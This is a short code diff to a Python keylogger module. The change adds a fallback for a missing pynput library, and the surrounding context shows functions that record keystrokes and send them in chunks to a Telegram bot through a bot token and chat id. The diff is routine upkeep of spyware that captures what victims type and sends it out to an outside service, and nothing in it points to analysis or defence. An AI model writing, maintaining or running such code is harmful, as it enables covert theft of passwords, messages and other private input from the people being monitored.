@@ -2,7 +2,10 @@ import base64
 import threading
 import time
 import logging
-from pynput import keyboard
+try:
+    from pynput import keyboard
+except ImportError:
+    keyboard = None
 from cryptography.fernet import Fernet
 from modules.network import send_to_telegram
 
@@ -34,6 +37,10 @@ def exfiltrate_keystrokes(bot_token, chat_id):
             send_to_telegram(bot_token, chat_id, f"Keylog data chunk:\n{chunk}")
 
 def start_keylogger(duration, bot_token, chat_id):
+    if not keyboard:
+        logging.error("Keylogger functionality is not available on this system.")
+        return
+
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
     time.sleep(duration)
